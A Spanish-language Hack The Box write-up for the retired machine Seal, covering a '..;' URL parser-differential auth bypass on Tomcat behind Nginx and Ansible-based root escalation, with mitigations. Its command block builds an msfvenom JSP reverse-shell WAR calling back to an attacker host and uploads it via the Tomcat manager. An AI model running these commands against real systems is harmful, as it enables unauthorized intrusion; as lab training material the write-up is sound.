---
machine: Seal
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, gitbucket, nginx, tomcat, parser-differential, ansible]
---

# Seal — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

GitBucket filtra configuraciones de Nginx y Tomcat. Una diferencia de normalización de URL entre el proxy y Tomcat permite saltarse la autenticación y desplegar una aplicación. Un backup y un playbook de Ansible ejecutado como root cierran la escalada.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,443,8080 <IP>
# GitBucket
git clone http://<IP>:8080/git/<USER>/<REPO>.git
cat nginx.conf; cat server.xml
# Parser differential
curl -s "http://seal.htb/manager/..;/html"
# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
curl -u <USER>:<PASS> --upload-file shell.war "http://seal.htb/manager/text/deploy?path=/shell"
# Ansible
find / -name "*.yml" -path "*ansible*" 2>/dev/null
```

## Enumeración

- GitBucket con repositorios y credenciales de despliegue.
- Nginx delante de Tomcat con reglas de autenticación por ruta.
- Backup periódico y Ansible ejecutado con privilegios.

## Acceso inicial

Se clonan los repositorios y se revisan `nginx.conf`, `server.xml` y credenciales. Se encuentra una discrepancia al interpretar `..;` o rutas codificadas; se despliega un WAR malicioso en Tomcat y se obtiene una shell.

## Escalada de privilegios

Un backup incluye archivos del siguiente usuario y su clave. Con acceso a esa cuenta se localiza un playbook de Ansible que se ejecuta como root; se modifica una tarea y se obtiene root.

## Evidencia

- Repositorios con configuración de Nginx/Tomcat.
- Ruta que evade la autenticación y WAR desplegado.
- Playbook de Ansible modificado y shell de root.

## Lecciones aprendidas

- Proxy y backend pueden interpretar la misma URL de forma distinta.
- GitBucket y los repositorios filtran secretos operativos.
- Ansible con privilegios es ejecución de código si el playbook es escribible.

## Mitigación y detección

- Normalizar y validar rutas en el proxy y en Tomcat.
- Restringir repositorios y rotar credenciales.
- Ejecutar Ansible con mínimo privilegio y proteger playbooks.

## Referencias

- [0xdf — Seal](https://0xdf.gitlab.io/2021/11/13/htb-seal.html)
- [Tomcat — Security](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)
- [Hack The Box — Seal](https://app.hackthebox.com/machines/seal)
